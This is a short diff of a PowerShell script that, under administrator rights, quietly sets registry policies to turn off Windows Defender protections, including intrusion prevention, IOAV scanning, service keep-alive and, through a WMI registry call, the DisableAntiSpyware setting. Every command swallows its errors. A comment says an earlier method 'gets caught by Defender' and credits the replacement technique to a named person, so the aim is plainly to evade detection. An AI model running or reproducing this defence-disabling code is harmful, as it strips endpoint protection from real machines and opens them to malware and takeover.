@@ -41,16 +41,16 @@ if (IsAdmin) {
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIntrusionPreventionSystem" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >$null 2>&1 } catch {}
     try { cmd.exe /C reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >$null 2>&1 } catch {}
-    # Disable AntiMalware Bypass as it gets caught    
+    
+    # Disable AntiMalware Bypass as it gets caught by Defender, method by fkxdr    
     try {
             $reg = Get-WmiObject -List | Where-Object { $_.Name -eq "StdRegProv" }
             $hive = 2147483650 # HKEY_LOCAL_MACHINE
             $path = "Software\Policies\Microsoft\Windows Defender"
             $name = "DisableAntiSpyware"
             $value = 1
-        
             $reg.SetDWORDValue($hive, $path, $name, $value)
-    }
+    } catch {}
         
     # Final output based on results
     if ($pendingFileRenameSuccess -or ((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -ErrorAction SilentlyContinue).DisableRealtimeMonitoring -eq 1)) {
